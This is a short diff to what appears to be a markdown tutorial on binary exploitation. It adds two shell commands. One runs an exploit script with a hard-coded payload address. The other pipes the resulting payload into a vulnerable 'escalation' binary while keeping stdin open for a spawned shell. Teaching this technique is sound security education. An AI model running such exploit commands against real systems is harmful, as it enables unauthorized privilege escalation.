@@ -319,6 +319,9 @@ the payload organization would be
                 '--- 28 bytes  ---'
 ```
 
+$ python public/code/exploit_simplest.py public/code/simplest_excalation  PAYLOAD=0xffffc990 > /tmp/payload
+$ (cat /tmp/payload ; cat ) | public/code/simplest_excalation
+
 ## Summary
 
 > Insecurity is about computation
